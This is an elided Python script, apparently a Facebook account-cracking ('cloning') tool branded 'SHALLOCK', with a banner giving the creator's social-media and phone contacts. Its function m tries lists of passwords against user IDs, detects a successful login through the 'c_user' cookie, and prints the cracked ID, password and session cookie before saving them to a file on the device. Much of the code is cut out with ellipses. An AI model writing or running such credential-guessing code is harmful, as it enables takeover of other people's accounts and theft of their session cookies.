...
ha = current.day
today = date.today()
#SHALLOCK2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
...
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.163 Mobile Safari/537.36;]"}
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

#agen1 = ['Mozilla/5.0 (Linux; Android 13; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.163 Mobile Safari/537.36']

#agen2 = ['Mozilla/5.0 (Linux; Android 13; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.163 Mobile Safari/537.36']
...
try:
    ...
    print('\x1b[1;92m[<\>]\x1b[1;97m \x1b[1;96mSHALLOCK')
...
for x in range(10):
    ...
    l='Mobile WVGA SMM-SHALLOCK/1.2.0 OPN-B'
...
def banner():
 ...
 \_\  \____/  ______   \____/ /_/ 
                |______|             
\033[1;91m--------------------------------------------
\033[1;91m[✓] CREATOR   > SHALLOCK
\033[1;91m[✓] FACEBOOK  > Syber king shallock
\033[1;91m[✓] GITHUB    > Shallock-petni-12
\033[1;91m[✓] VERSION   > FREE
\033[1;91m[✓] WHATSAPP  > +8801604788127
\033[1;91m--------------------------------------------{P}""")
...
def m(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            "sec-ch-ua": '".Not/A)Brand";v="8", "Google Chrome";v="108", "Chromium";v="108"',
            "sec-ch-ua-mobile": '?0',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                #os.system("play-audio SHALLOCK_OK.mp3")
                print('\033[1;92m[SHALLOCK-OK] '+uid+' | '+ps+'\033[0;97m')
                #print(f'{B}[NUMBER☎️] {K}'+uid+'  ')
                print(f'{B}[COOKIE💉] {H}'+coki)
                cek_apk(session,coki)
                open('/sdcard/Shallock-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                break
            else:
                continue
        loop+=1
        animasi = random.choice(["\x1b[1;91mSHALLOCK","\x1b[1;92mSHALLOCK","\x1b[1;93mSHALLOCK","\x1b[1;94mSHALLOCK","\x1b[1;95mSHALLOCK","\x1b[1;96mSHALLOCK","\x1b[1;97mSHALLOCK","\x1b[1;91mSHALLOCK","\x1b[1;92mSHALLOCK","\x1b[1;93mSHALLOCK","\x1b[1;94mSHALLOCK","\x1b[1;95mSHALLOCK","\x1b[1;96mSHALLOCK"])
